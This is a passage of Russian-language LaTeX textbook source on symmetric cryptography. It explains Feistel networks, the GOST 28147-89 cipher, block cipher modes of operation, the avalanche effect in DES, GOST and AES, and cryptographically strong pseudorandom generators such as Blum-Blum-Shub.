Одним из основных методов построения современных блоковых шифров является ячейка \textbf{Фейстеля} (Feistel), изображенная на рисунке \ref{fig:Feistel}. Главная особенность шифрования с ячейкой Фейстеля состоит в том, что обратимость шифрования (т.е. расшифрование) не зависит от обратимости преобразования $F$ внутри ячейки. Широкое применение ячеек Фейстеля в шифрах 1970--90-х годов вызвано бурным развитием персональных компьютеров. Шифрование выполняется \textbf{раундами}, на каждом раунде выполняется одно и то же преобразование ячейки Фейстеля, но с разными ключами. Общее количество раундов 16--32.

\begin{figure}[!ht]
    \centering
    \includegraphics[width=0.6\textwidth]{pic/feistel}
    \caption{Ячейка Фейстеля\label{fig:Feistel}}
\end{figure}

Здесь введены обозначения: $X$ -- блок двоичных символов, который записан в регистр памяти, состоящий из двух частей, $X = (L,R)$, где $L$ -- начальное содержимое левого регистра, $\tilde{L}$ -- содержимое левого регистра сдвига после преобразования, $R$ -- начальное содержимое правого регистра, $\tilde{R}$ -- содержимое правого регистра после преобразования, $K$ -- ключ шифрования, задающий преобразование $F(K,R)$. Знак $\oplus$ определяет операцию побитового суммирования по модулю 2, то есть операцию XOR. Перекрестные линии указывают на замену частей регистра. После одного элементарного преобразования содержимое правого регистра заменяется содержимым левого регистра и наоборот. $\tilde{L},\tilde{R}$ -- результат элементарного шифрования, выполненного за один раунд. $L_{1}$ -- содержимое правого регистра после замены, $R_{1}$ -- содержимое левого регистра после замены. Основным шифрующим преобразованием является функция $F$.

Ячейка Фейстеля -- произведение двух перестановок $T$ и $G$, где $T$ -- замена левой части на правую и наоборот. Запишем преобразование $Y=TG(X,L)$, выполняемое этой ячейкой:
\[
  \begin{array}{l}
    \tilde{X} = (\tilde{L}, \tilde{R}) = (L \oplus F(K,R), R) \equiv G(X, L), \\
    Y = TGX. \\
  \end{array}
\]

Если дважды применим перестановку, то получим снова открытый текст:
\[
    \begin{array}{l}
        \tilde{\tilde{L}} = \tilde{L} \oplus F(K, \tilde{R}) = (L \oplus F(K,R) \oplus F(K,R)) = L, \\
        \tilde{\tilde{R}} = R.\\
    \end{array}
\]

Многократное применение преобразования $Y=TG(X,L)$ с различными ключами представим в виде
\[
  \begin{array}{l}
    Y_1 = T G_1 X,\\
    Y_2 = T G_2 Y_1 = T G_2 T G_1 X, \\
    \ldots, \\
    Y_{m-1} = T G_{m-1} Y_{m-2} = T G_{m-1} T G_{m-2} \ldots T G_1 X.\\
  \end{array}
\]
В первом уравнении показан результат первого шифрования с ключом $K_{1}$, во втором уравнении -- результат шифрования с ключом $K_{2}$ и т.д., в $(m-1)$-м уравнении -- результат с ключом $K_{m-1}$. В последнем, $(m)$-м уравнении, перестановку $T$ можно не использовать:
\[
   Y_{m}= G_{m} Y_{m-1} = G_{m} T G_{m-1} \ldots T G_{1} X.\\
\]

Как видно из приведенных соотношений, пара величин -- содержимое регистра и первый ключ $X, K_{1}$ -- влияет на все позиции шифрованного текста. Полностью разрушается статистическая структура исходного текста за счет преобразований, вызывающих \emph{лавинный эффект}\index{лавинный эффект}. \textbf{Лавинный эффект} -- это распространение <<влияния>> одного бита открытого текста (или ключа) на все остальные биты шифруемого блока за определенное количество раундов.
%Для ячеек Фейстеля это количество равно 2.

Одной из характеристик блокового шифра является число раундов, за которое достигается полная диффузия (конфузия) -- зависимость всех битов выхода (входа) от всех битов входа (выхода). Вход -- это открытый текст и ключ.

Криптостойкость ячейки Фейстеля подтверждается тем фактом, что не существует примеров ее взлома (в случае шифра DES взлом был сделан полным перебором 56-битового ключа, а не взломом самой криптосистемы; например, российский стандарт ГОСТ 28147-89 на ячейке Фейстеля с 256-битовым ключом не взломан).

Рассмотрим процедуру расшифрования. Легальный пользователь знает все ключи и последовательность их применения. Он выполняет следующие операции. Имеем шифрованное сообщение $Y_{m}$. На первом шаге вычисляет
\[
    G_{m} Y_{m} = G_{m} G_{m} Y_{m-1} = Y_{m-1}.
\]
На втором шаге использует найденное сообщение $Y_{m-1}$ и аналогично находит $Y_{m-2}$:
\[
    G_{m-1} T Y_{m-1} = G_{m-1} T T G_{m-1} Y_{m-2} = Y_{m-2}.
\]
Продолжает этот процесс до получения $Y_{1}$. После этого находит $X$:
\[
    G_{1} T Y_{1} = G_{1} T T G_{1} X = X.
\]
Как показали эти операции, вычислительная сложность устройства расшифрования ячейки Фейстеля такая же, как сложность устройства шифрования.

Раундовые блоковые шифры должны обеспечивать \emph{диффузию}, при которой каждый бит входа и ключа влияет на все биты выхода, и \emph{конфузию}, при которой каждый бит выхода нелинейно зависит от всех битов входа и ключа.

Основные свойства, которыми должна обладать функция $F$:
\begin{itemize}
    \item создание лавинного эффекта;
    \item нелинейность по отношению к операции XOR.
\end{itemize}

Как правило, функция $F$ включает таблицы перестановки $P$ и подстановки групп бит, так называемые $s$-блоки\index{$s$-блок} (от слова substitution), и функцию перестановки, перемешивающую биты между последовательно исполняемыми $s$-блоками. В совокупности эти действия и обеспечивают требуемые свойства ячейки.


\section{Российский стандарт шифрования ГОСТ 28147-89}
\selectlanguage{russian}

Стандарт шифрования \textbf{ГОСТ 28147-89} \cite{GOST-89} относится к действующим симметричным одноключевым криптографическим алгоритмам. Он зарегистрирован 2 июня 1989 года и введен в действие Постановлением Государственного комитета СССР по стандартам от 02.06.89 № 1409.
%Дата актуализации описания 01 февраля 2008 года, дата актуализации текста 15 марта 2009года.
Последнее изменение внесено в алгоритм 13 марта 2007 года.
ГОСТ 28147-89 устанавливает единый алгоритм криптографических преобразований для систем обмена информацией в вычислительных сетях и определяет правила шифрования и расшифрования данных, а также выработки имитовставки\index{имитовставка}. Основные параметры шифра таковы: размер блока составляет 64 бита, число раундов $m=32$, имеется 8 ключей по 32 бита каждый, так что общая длина ключа 256 бит. Основа алгоритма -- цепочка ячеек Фейстеля.

\begin{figure}[!ht]
    \centering
    \includegraphics[width=0.6\textwidth]{pic/gost-28147-89}
    \caption{Схема ГОСТ 28147-89\label{fig:gost-28147-89}}
\end{figure}

Структурная схема алгоритма шифрования представлена на рисунке \ref{fig:gost-28147-89} и включает
\begin{itemize}
    \item ключевое запоминающее устройство (КЗУ) на 256 бит, которое состоит из восьми 32-разрядных накопителей $(X_0, X_1, X_2, X_3, X_4, X_5, X_6, X_7)$ и содержит сеансовые ключи шифрования одного раунда;
    \item 32-разрядный сумматор $\boxplus$ по модулю $2^{32}$;
    \item сумматор $\oplus$ по модулю 2;
    \item блок подстановки $(S)$;
    \item регистр циклического сдвига на одиннадцать шагов в сторону старшего разряда  $(R)$.
\end{itemize}

Блок подстановки $(S)$ состоит из 8 узлов замены, $s$-блоков, с памятью на 64 бита каждый. Поступающий на вход блока подстановки 32-разрядный вектор разбивается на восемь последовательных 4-разрядных векторов, каждый из которых преобразуется в 4-разрядный вектор соответствующим узлом замены. Узел замены представляет собой таблицу из шестнадцати строк, содержащих по четыре бита в строке. Входной вектор определяет адрес строки в таблице, заполнение данной строки является выходным вектором. Затем 4-разрядные выходные векторы последовательно объединяются в 32-разрядный вектор.

При перезаписи информации содержимое $i$-го разряда одного накопителя переписывается в $i$-й разряд другого накопителя.

Ключ, определяющий заполнение КЗУ, и таблицы блока подстановки $K$ являются секретными элементами.

Стандарт не накладывает ограничений на степень секретности защищаемой информации.

ГОСТ 28147-89 удобен как для аппаратной, так и для программной реализации.

Алгоритм имеет четыре режима работы. Из них первые три -- режимы шифрования, а  последний -- генерирования имитовставки\index{имитовставка} (другие названия: инициализирующий вектор, синхропосылка):
\begin{itemize}
    \item простой замены;
    \item гаммирования;
    \item гаммирования с обратной связью;
    \item выработки имитовставки\index{имитовставка}.
\end{itemize}


Подробно данные режимы описаны в следующем разделе.


\input{AES}

\section{Режимы работы блоковых шифров}\label{chapter-block-chaining}
\selectlanguage{russian}

Открытый текст $M$, представленный как двоичный файл, перед шифрованием разбивают на части $M_1, M_2, \dots, M_n$, называемые пакетами. Предполагается, что размер в битах каждого пакета существенно превосходит длину блока шифрования, которая равна 64 бит для российского стандарта и 128 для американского стандарта AES.

В свою очередь, каждый пакет $M_i$ разбивается на блоки размера, равного размеру блока шифрования:
    \[ M_i = \left[ M_{i,1}, M_{i,2}, \dots, M_{i,n_i} \right]. \]
Число блоков $n_i$ в разных пакетах может быть разным. Кроме того, последний блок пакета $M_{i,n_i}$ может иметь размер, меньший размера блока шифрования. В этом случае для него применяют процедуру дополнения (удлинения) до стандартного размера. Процедура должна быть обратимой: после расшифрования последнего блока пакета лишние байты должны быть обнаружены и удалены. Некоторые способы дополнения:
\begin{itemize}
  \item добавить один байт со значением $128$, а остальные байты пусть будут нулевые;
  \item определить, сколько байтов надо добавить к последнему блоку, например $b$, и добавить $b$ байтов со значением $b$ в каждом.
\end{itemize}
В дальнейшем предполагается, что такое дополнение сделано для каждого пакета. При шифровании блоков внутри одного пакета первый индекс в нумерации блоков опускается, то есть вместо обозначения $M_{i,j}$ используется $M_j$.

Для шифрования всего открытого текста $M$ и, следовательно, всех пакетов используется один и тот же  \emph{сеансовый} ключ шифрования  $K$. Процедуру передачи одного пакета будем называть \emph{сеансом}.

Существует несколько режимов работы блоковых шифров: режим электронной кодовой книги, режим шифрования зацепленных блоков, режим обратной связи, режим шифрованной обратной связи, режим счетчика. Рассмотрим особенности каждого из этих режимов.


\subsection{Электронная кодовая книга}

В режиме электронной кодовой книги (аббревиатура ECB от английского названия Electronic Code Book) открытый текст в пакете разделен на блоки
    \[ \left[ M_1, M_2, \dots, M_{n-1}, M_n \right]. \]

В процессе шифрования каждому блоку $M_j$ соответствует свой шифротекст $C_j$, определяемый с помощью ключа $K$:
    \[ C_j = E_K(M_j), ~ j = 1, 2, \dots, n. \]

Если в открытом тексте есть одинаковые блоки, то в шифрованном тексте им также соответствуют одинаковые блоки. Это дает дополнительную информацию для криптоаналитика, что является недостатком этого режима. Другой недостаток состоит в том, что криптоаналитик может подслушивать, перехватывать, переставлять, воспроизводить ранее записанные блоки, нарушая конфиденциальность и целостность информации. Поэтому при работе в режиме электронной кодовой книги нужно вводить аутентификацию сообщений.

Шифрование в режиме электронной кодовой книги не использует сцепление блоков и синхропосылку\index{синхропосылка} (вектор инициализации)\index{вектор инициализации}. Поэтому для данного режима применима атака на различение сообщений, так как два одинаковых блока или два одинаковых открытых текста шифруются одинаково.

На рис. \ref{fig:ecb-demo} приведен пример шифрования графического файла морской звезды в формате BMP, 24 бит цветности на пиксел (рис. \ref{fig:starfish}), блоковым шифром AES с длиной ключа 128 бит в режиме электронной кодовой книги  (рис. \ref{fig:starfish-aes-128-ecb}). В начале зашифрованного файла был восстановлен стандартный заголовок формата BMP. Как видно, в зашифрованном файле изображение все равно различимо.
\begin{figure}[!ht]
    \centering
    \subfloat[Исходный рисунок]{\label{fig:starfish} \includegraphics[width=0.45\textwidth]{pic/starfish}}
    ~~~
    \subfloat[Рисунок, зашифрованный AES-128]{\label{fig:starfish-aes-128-ecb} \includegraphics[width=0.45\textwidth]{pic/starfish-aes-128-ecb}}
    \caption{Шифрование в режиме электронной кодовой книги\label{fig:ecb-demo}}
\end{figure}
BMP файл в данном случае содержит в самом начале стандартный заголовок (ширина, высота, количество цветов) и далее идет массив 24-битовых значений цвета пикселов, взятых построчно сверху вниз. В массиве много последовательностей нулевых байтов, так как пикселы белого фона кодируются 3 нулевыми байтами. В AES размер блока равен 16 байтов и, значит, каждые $\frac{16}{3}$ подряд идущих пикселов белого фона шифруются одинаково, позволяя различить изображение в зашифрованном файле.

%На рис. \ref{fig:ecb-demo} приведен пример шифрования графического файла логотипа Википедии в формате BMP, 24 бит цветности на пиксел (рис. \ref{fig:wikilogo}), блоковым шифром AES с длиной ключа 128 бит в режиме электронной кодовой книги  (рис. \ref{fig:wikilogo-aes-128-ecb}). В начале зашифрованного файла был восстановлен стандартный заголовок BMP формата. Как видно, на зашифрованном рисунке возможно даже прочитать надпись.
%\begin{figure}[!ht]
%    \centering
%    \subfloat[Исходный рисунок]{\label{fig:wikilogo}\includegraphics[width=0.45\textwidth]{pic/wikilogo}}
%    ~~~
%    \subfloat[Рисунок, зашифрованный AES-128]{\label{fig:wikilogo-aes-128-ecb}\includegraphics[width=0.45\textwidth]{pic/wikilogo-aes-128-ecb}}
%    \caption{Шифрование в режиме электронной кодовой книги.}
%    \label{fig:ecb-demo}
%\end{figure}

%Возможно воссоздание структуры информации -- например, пингвин на рис. \ref{fig:tux-ecbmode}. Картинка с пингвином записана в формате BMP и зашифрована DES в режиме электронной кодовой книги.
%\begin{figure}[!ht]
%    \centering
%    \includegraphics[width=0.3\textwidth]{pic/tux-ecb}
%    \caption{Картинка с пингвином, зашифрованная в режиме электронной кодовой книги.}
%    \label{fig:tux-ecbmode}
%\end{figure}


\subsection{Сцепление блоков шифротекста}

В режиме сцепления блоков шифротекста (аббревиатура CBC от английского названия Cipher Block Chaining) перед шифрованием текущего блока открытого текста предварительно производится его суммирование по модулю 2 с предыдущим блоком зашифрованного текста, что и осуществляет <<сцепление>> блоков. Процедура шифрования имеет вид
\[ \begin{array}{l}
    C_1 = E_K(M_1 \oplus C_0), \\
    C_j = E_K(M_j \oplus C_{j-1}), ~ j = 1, 2, \dots,  n,
\end{array} \]
где $C_0 = \textrm{IV}$ --  вектор, называемый вектором инициализации (обозначение $\textrm{IV}$ от Initialization Vector). Другое название -- синхропосылка.

Благодаря сцеплению \emph{одинаковым} блокам открытого текста соответствуют \emph{различные} шифрованные блоки. Это затрудняет криптоаналитику статистический анализ потока шифрованных блоков.

На приемной стороне расшифрование осуществляется по правилу
\[ \begin{array}{l}
    D_K(C_j) = M_j \oplus C_{j-1}, ~ j=1, 2, \dots, n,\\
    M_{j} = D_K(C_j) \oplus C_{j-1}.
\end{array} \]

Блок $C_0 = \textrm{IV}$ должен быть известен легальному получателю шифрованных сообщений. Обычно криптограф выбирает его случайно и вставляет на первое место в поток шифрованных блоков. Сначала передают блок $C_0$, а затем шифрованные блоки $C_1, C_2, \ldots, C_n$.

В разных пакетах блоки $C_0$ должны выбираться независимо. Если их выбрать одинаковыми, то возникают проблемы, аналогичные проблемам в режиме ECB. Например, часто первые нешифрованные блоки $M_1$ в разных пакетах бывают одинаковыми. Тогда одинаковыми будут и первые шифрованные блоки.

Однако случайный выбор векторов инициализации также имеет свои недостатки. Для выбора такого вектора необходим хороший генератор случайных чисел. Кроме того, каждый пакет удлиняется на один блок.

Нужны такие процедуры выбора $C_0$ для каждого сеанса передачи пакета, которые известны криптографу и легальному пользователю. Одним из решений является использование так называемых \emph{одноразовых меток}. Каждому сеансу присваивается уникальное число. Его уникальность состоит в том, что оно используется только один раз и никогда не должно повторяться в других пакетах. В англоязычной научной литературе оно обозначается как \emph{Nonce}, то есть сокращение от <<Number used once>>\index{одноразовая метка}.

Обычно одноразовая метка состоит из номера сеанса и дополнительных данных, обеспечивающих уникальность. Например, при двустороннем обмене шифрованными сообщениями одноразовая метка может состоять из номера сеанса и индикатора направления передачи. Размер одноразовой метки должен быть равен размеру шифруемого блока. После определения одноразовой метки $\textrm{Nonce}$ вектор инициализации вычисляется в виде
    \[ C_0 = \textrm{IV} = E_K(\textrm{Nonce}). \]

Этот вектор используется в данном сеансе для шифрования открытого текста в режиме CBC. Заметим, что блок $C_0$ передавать в сеансе не обязательно, если приемная сторона знает заранее дополнительные данные для одноразовой метки. Вместо этого достаточно вначале передать только номер сеанса в открытом виде. Приемная сторона добавляет к нему дополнительные данные и вычисляет блок $C_0$, необходимый для расшифрования в режиме CBC. Это позволяет сократить издержки, связанные с удлинением пакета. Например, для шифра AES длина блока $C_0$ равна $16$ байтов. Если число сеансов ограничить величиной $2^{32}$ (вполне приемлемой для большинства приложений), то для передачи номера пакета понадобится только $4$ байта.


\subsection{Обратная связь по выходу}

В предыдущих режимах входными блоками для устройств шифрования были непосредственно блоки открытого текста.
В режиме обратной связи по выходу (OFB от Output FeedBack) блоки открытого текста непосредственно на вход устройства шифрования не поступают. Вместо этого устройство шифрования генерирует псевдослучайный поток байтов, который суммируется по модулю $2$ с открытым текстом для получения шифрованного текста. Шифрование осуществляют по правилу
\[ \begin{array}{l}
    K_0 = \textrm{IV}, \\
    K_j = E_K(K_{j-1}), ~ j = 1, 2, \dots, n, \\
    C_j = K_j \oplus M_j.
\end{array} \]

Здесь текущий ключ $K_j$ есть результат шифрования предыдущего ключа $K_{j-1}$. Начальное значение $K_0$ известно криптографу и легальному пользователю. На приемной стороне расшифрование выполняют по правилу
\[ \begin{array}{l}
    K_0 = \textrm{IV}, \\
    K_j = E_K(K_{j-1}), ~ j = 1, 2, \dots, n, \\
    M_j = K_j \oplus C_j.
\end{array} \]

Как и в режиме CBC, вектор инициализации $\textrm{IV}$ может быть выбран случайно и передан вместе с шифрованным текстом либо вычислен на основе одноразовых меток. Здесь особенно важна уникальность вектора инициализации.

Достоинство этого режима состоит в полном совпадении операций шифрования и расшифрования. Кроме того, в этом режиме не надо проводить операцию дополнения открытого текста.


\subsection{Обратная связь по шифрованному тексту}

В режиме обратной связи по шифрованному тексту (CFB от Cipher FeedBack) ключ $K_j$ получается с помощью процедуры шифрования предыдущего шифрованного блока $C_{j-1}$. Может быть использован не весь блок $C_{j-1}$, а только часть его. Как и в предыдущем случае, начальное значение ключа $K_0$ известно криптографу и легальному пользователю:
\[ \begin{array}{l}
    K_0 = \textrm{IV}, \\
    K_j = E_K(C_{j-1}), ~ j = 1, 2, \dots, n,\\
    C_j = K_j \oplus M_j.
\end{array} \]

У этого режима нет особых преимуществ по сравнению с другими режимами.


\subsection{Счетчик}

В режиме счетчика (CTR от Counter) правило шифрования имеет вид, похожий на режим обратной связи по выходу (OFB), но позволяющий вести независимое (параллельное) шифрование и расшифрование блоков:
\[ \begin{array}{l}
    K_j = E_K(\textrm{Nonce} \| j - 1), ~ j = 1, 2, \dots, n, \\
    C_j = M_j \oplus K_j,
\end{array} \]
где $\textrm{Nonce} \| j - 1$ -- конкатенация битовой строки одноразовой метки $\textrm{Nonce}$ и номера блока уменьшенного на единицу $j-1$.
%Для стандарта AES значение $\textrm{Nonce}$ занимает 16 бит, номер блока -- 48 бит. С одним ключом выполняется шифрование $2^{48}$ блоков.

Правило расшифрования идентичное:
\[ \begin{array}{l}
    M_j = C_j \oplus K_j. \\
\end{array} \]


\section{Некоторые свойства блоковых шифров}

\subsection{Обратимость схемы Фейстеля}
\selectlanguage{russian}

Покажем, что обратимость схемы Фейстеля не зависит от выбора функции $F$.

Напомним, что схема Фейстеля -- это итеративное шифрование, в котором выход подается на вход следующей итерации по правилу
\[ \begin{array}{l}
    L_i = R_{i-1}, \\
    R_i = L_{i-1} \oplus F(R_{i-1}, K_i), \\
\end{array} \]
\[
    (L_0,R_0) \rightarrow (L_1,R_1) \rightarrow \ldots \rightarrow (L_n,R_n).
\]

При расшифровании используется та же схема, только левая и правая части меняются местами перед началом итераций, и ключи раунда подаются в обратном порядке
    \[ R_i = L_{i-1} \oplus F(R_{i-1}, K_{n+1-i}), \]
\[ \begin{array}{l}
    L_0^* = R_n = L_{n-1} \oplus F(R_{n-1}, K_n), \\
    R_0^* = L_n = R_{n-1}, \\
    \\
%\end{array} \]
%\[ \begin{array}{l}
    L_1^* = R_{n-1}, \\
    R_1^* = L_{n-1} \oplus F(R_{n-1}, K_n) \oplus F(R_{n-1}, K_n) = L_{n-1}, \\
    \dots
\end{array} \]


\input{Feistel_cipher_without_s_blocks}

\subsection{Лавинный эффект}
\selectlanguage{russian}

\subsubsection{Лавинный эффект в DES}

Оценим число раундов, за которое в DES достигается полный лавинный эффект\index{лавинный эффект}, предполагая \emph{случайное} расположение бит перед расширением, $s$-блоками ($s$ -- substitute, блоки замены) и XOR.

Пусть на входе правой части $R_i$ содержится $r$ бит, на которые уже распространилось влияние 1 вначале выбранного бита. После расширения получим
    \[ n_1 \approx \min(1.5 \cdot r, 32) \]
зависимых бит. Предполагая случайные попадания в 8 $s$-блоков, мы увидим, что, согласно задаче о размещении, биты попадут в
    \[ s_2 = 8 \left( 1 - \left( 1 - \frac{1}{8} \right)^{n_1} \right) \approx 8 \left( 1 - e^{-\frac{n_1}{8}} \right) \]
$s$-блоков. Одно из требований NSA к $s$-блокам заключалось в том, чтобы изменение каждого бита входа \emph{изменяло} 2 бита выхода. Мы предположим, что каждый бит входа $s$-блока \emph{влияет} на все 4 бита выхода. Зависимыми станут
    \[ n_2 = 4 \cdot s_2 = 32 \left( 1 - e^{-\frac{n_1}{8}} \right) \]
бит. При дальнейшем XOR с величиной $L_i$, содержащей $l$ зависимых бит, результатом будет
    \[ n_3 \approx n_2 + l  - \frac{n_2 l}{32} \]
зависимых бит.

\begin{table}[!ht]
    \centering
    \caption{Распространение влияния 1 бита левой части в DES\label{tab-DES-avalance-effect}}
    \begin{tabular}{||c||c||c|c|c||}
        \hline
        \multirow{3}{*}{Раунд} & $L_i$ & \multicolumn{3}{|c||}{$R_i$} \\
        \cline{2-5}
        & & Расширение & $s$-блоки & $R_{i+1} = f(R_i) \oplus L_i$ \\
        & $l$ & $r \rightarrow n_1$ & $n_1 \rightarrow n_2$ & $(n_2, l) \rightarrow n_3$ \\
        \hline \hline
        0 & 1 & 0 & 0 & 0 \\
        1 & 0 & 0 & 0 & $(0,1) \rightarrow 1$ \\
        2 & 1 & $1 \rightarrow 1.5$ & $1.5 \rightarrow 5.5$ & $(5.5, 0) \rightarrow 5.5$ \\
        3 & 5.5 & $5.5 \rightarrow 8.2$ & $8.2 \rightarrow 20.5$ & $(20.5, 1) \rightarrow 20.9$ \\
        4 & 20.9 & $20.9 \rightarrow 31.3$ & $31.3 \rightarrow 32$ & $(32, 20.9) \rightarrow 32$ \\
        5 & 32 & 32 & 32 & 32 \\
      \hline
    \end{tabular}
\end{table}

В таблице \ref{tab-DES-avalance-effect} приводится расчет распространения 1 бита левой части. Посчитано число зависимых битов по раундам в предположении об их случайном расположении и том, что каждый бит на входе $s$-блока \emph{влияет} на все биты выхода. Полная диффузия достигается за 5 раундов, что совпадает с экспериментальной проверкой. Для достижения максимального лавинного эффекта требуется аккуратно выбрать расширение, $s$-блоки, а также перестановку в функции $F$.


\subsubsection{Лавинный эффект в ГОСТ 28147-89}

Лавинный эффект\index{лавинный эффект} по входу обеспечивается $(4 \times 4)$ $s$-блоками и циклическим сдвигом влево на $11 \neq 0 \mod 4$.

\begin{table}[!ht]
    \centering
    \caption{Распространение влияния 1 бита левой части в ГОСТ 28147-89\label{tab:GOST-avalance-effect}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{||c||c|c|c|c|c|c|c|c||c|c|c|c|c|c|c|c||}
        \hline
        \multirow{2}{*}{Раунд} & \multicolumn{8}{|c||}{$L_i$} & \multicolumn{8}{|c||}{$R_i$} \\
        \cline{2-17}
              & 1 & 2 & 3 & 4 & 5 & 6 & 7 & 8   &   1 & 2 & 3 & 4 & 5 & 6 & 7 & 8 \\
        \hline \hline
        0     &   &   &   &   &   &   &   & 1   &     &   &   &   &   &   &   &   \\
        1     &   &   &   &   &   &   &   &     &     &   &   &   &   &   &   & 1 \\
        2     &   &   &   &   &   &   &   & 1   &     &   &   &   & 3 & 1 &   &   \\
        3     &   &   &   &   & 3 & 1 &   &     &     & 3 & 4 & 1 &   &   &   & 1 \\
        4     &   & 3 & 4 & 1 &   &   &   & 1   &   4 & 1 &   &   & 3 & 1 & 3 & 4 \\
        5     & 4 & 1 &   &   & 3 & 1 & 3 & 4   &     & 3 & 4 & 4 & 4 & 4 & 4 & 1 \\
        6     &   & 3 & 4 & 4 & 4 & 4 & 4 & 1   &   4 & 4 & 4 & 4 & 4 & 3 & 3 & 4 \\
        7     & 4 & 4 & 4 & 4 & 4 & 3 & 3 & 4   &   4 & 4 & 4 & 4 & 4 & 4 & 4 & 4 \\
        8     & 4 & 4 & 4 & 4 & 4 & 4 & 4 & 4   &   4 & 4 & 4 & 4 & 4 & 4 & 4 & 4 \\
      \hline
    \end{tabular} }
\end{table}

Из таблицы \ref{tab:GOST-avalance-effect} видно, что на каждом раунде число зависимых битов увеличивается в среднем на 4 в результате сдвига и попадания выхода $s$-блока предыдущего раунда в два $s$-блока следующего раунда. Показано распространение зависимых битов в группах по 4 бита в левой и правой частях без учета сложения с ключом раунда. Предполагается, что каждый бит на входе $s$-блока влияет на все биты выхода. Число раундов для достижения полного лавинного эффекта без учета сложения с ключом -- 8. Экспериментальная проверка для $s$-блоков, используемых Центробанком РФ, показывает, что требуется 8 раундов.


\subsubsection{Лавинный эффект в AES}

В первом раунде один бит оказывает влияние на один байт в операции <<Замена байтов>> и затем на столбец из четырех байтов в операции <<Смешивание столбцов>>\index{лавинный эффект}.

Во втором раунде операция <<Сдвиг строки>> сдвигает байты измененного столбца на разное число байтов по строкам, в результате получаем диагональное расположение измененных байт, то есть в каждой строке присутствует по измененному байту. Далее, в результате операции <<Смешивание столбцов>> изменение распространяется от байта в столбце на весь столбец и, следовательно, на всю матрицу.

Диффузия по входу достигается за 2 раунда.


\input{double_and_triple_ciphering}

\chapter{Потоковые шифры}\label{chapter-stream-ciphers}

\section{Посимвольное шифрование}
\selectlanguage{russian}

Потоковые шифры осуществляют посимвольное шифрование открытого текста. Их основные достоинства: большая скорость шифрования по сравнению с блоковыми шифрами и относительно простая реализация.

Пусть имеется двоичная последовательность $x_{1} x_{2} \dots x_{N}$, представляющая открытый текст, и последовательность ключей $k_{1} k_{2} \dots k_{N}$. Шифрованная последовательность представляет собой сумму по модулю 2 этих двух последовательностей
\[ \begin{array}{l}
    y_{1} = x_{1} \oplus k_{1}, \\
    y_{2} = x_{2} \oplus k_{2}, \\
    \dots \\
    y_{N} = x_{N} \oplus k_{N}.
\end{array} \]

Если бы в двоичной последовательности ключей все символы были независимы, и нули и единицы равновероятны, то такая система по доказанному выше была бы совершенной, то есть обеспечивала бы независимость шифрованного текста от исходного текста и, как следствие, равенство нулю количества взаимной информации. Поэтому одна из основных задач при разработке систем потокового шифрования состоит в построении последовательностей с равномерным, случайным и независимым распределением.

Существует много способов построения двоичных последовательностей с распределением, близким к равномерному. Они называются псевдослучайными последовательностями\index{число!псевдослучайное}.

Пусть имеем некоторую двоичную последовательность $z_{1} z_{2} \ldots z_{N}$, полученную в результате подбрасывания <<неправильной монеты>> (монета считается неправильной, так как дает неравномерное распределение) с неравномерным распределением. Когда выпадал герб, записывали символ $1$. Когда выпадала решка, записывали символ $0$. Чтобы теперь приблизить распределение к равномерному, преобразуем эту последовательность с помощью алгоритма Джона фон Неймана (John von Neumann). Разделим символы на пары. Если $z_{1} z_{2} = 11$ или $z_{1} z_{2} = 00$, то пара выбрасывается из последовательности; если $z_{1} z_{2} =10$, то записываем новый символ $u=1$; если $z_{1} z_{2} =01$, то записываем новый символ $u=0$. Получаем новую двоичную последовательность символов $u_{1}u_{2}\ldots $, у которой распределение нулей и единиц ближе к равномерному.
%(См. \textbf{Приложение 2}).


\section{Криптостойкие последовательности} %{Генерирование криптостойких псевдослучайных последовательностей бит}

Генераторы псевдослучайных чисел (ГПСЧ) ставят в соответствие набору символов $z_{1} z_{2} \dots z_{l}$ значение некоторой функции $f(z_{1} z_{2} \dots z_{l}) = f_{1}$. Следующим $l$ символам -- $f(z_{l+1} z_{l+2} \dots z_{2l}) = f_{2}$. Получают набор значений $f_{1} f_{2} \dots f_{N}$ и используют их в качестве случайной последовательности.

Для проверки степени близости к независимости и равномерному распределению символов существует набор тестов. Американский институт стандартизации NIST разработал 16 тестов на псевдослучайность. Подсчитывается число нулей и единиц, число одинаковых соседних пар, число одинаковых подпоследовательностей, автокорреляция, частота следующего символа в зависимости от предыдущих и т.д. Вычисляют вероятность символа 0 (или 1)
\[
    P(f_i = 0 | f_{i-1} f_{i-2} \dots f_{i-k}) = \frac{1}{2} - \epsilon.
\]
Если вычисления осуществляются за полиномиальное время от длины подпоследовательности $k$, то есть с количеством битовых операций $O(k^{\textrm{const}})$, то тест называют \emph{полиномиальным}\index{задача!полиномиальная}.

Псевдослучайная последовательность удовлетворяет \textbf{тесту <<следующего бита>>}, если не существует полиномиального по $k$ теста, позволяющего по предыдущим $k$ битам определить следующий бит с вероятностью, отличной от $\frac{1}{2} - \epsilon$, принимая во внимание погрешность оценки $\epsilon$. Последовательность, удовлетворяющая тесту <<следующего бита>>, также удовлетворяет всем возможным полиномиальным тестам по $k$ на равномерность распределения, и наоборот.

Последовательность называется \emph{криптографически стойкой} или \emph{криптостойкой}, если она удовлетворяет тесту <<следующего бита>>.

\subsection{Генератор BBS}
\selectlanguage{russian}

Имеются примеры <<хороших>> генераторов, вырабатывающих криптографически стойкие последовательности, например, генератор \textbf{Blum-Blum-Shub (BBS)}. Алгоритм работы состоит в следующем. Выбирают большие (длиной не менее 512 бит) простые числа $p, q$, которые при делении на $4$ дают в остатке $3$. Вычисляют $n = p q$. С помощью датчика случайных чисел вырабатывают число $x_{0}$, где $1 \leq x_0 \leq n-1$ и $\gcd(x_0, n) = 1$. Далее проводят следующие вычисления:
\[ \begin{array}{l}
        x_{1} = x_{0}^{2} \mod n,\\
        x_{2} = x_{1}^{2} \mod n,\\
        \dots\\
        x_{N} = x_{N-1}^{2} \mod n.
\end{array} \]

Для каждого вычисленного значения оставляют один младший разряд. Вычисляют двоичную псевдослучайную последовательность $k_1 k_2 k_3 \dots$:
\[ \begin{array}{l}
        k_{1} = x_{1} \mod 2,\\
        k_{2} = x_{2} \mod 2,\\
        \dots \\
        k_{N} = x_{N} \mod 2.
\end{array} \]

Число $a$ называется \emph{квадратичным вычетом} по модулю $n$, если для него существует квадратный корень $b$ (или два корня): $a = b^2 \mod n$. Для $p,q ~=~ 3 \mod 4$ верно утверждение, что квадратичный вычет имеет единственный корень и операция $x \rightarrow x^2 \mod n$, примененная к элементам множества всех квадратичных вычетов $\set{QR}_n$ по модулю $n$, является перестановкой множества $\set{QR}_n$.

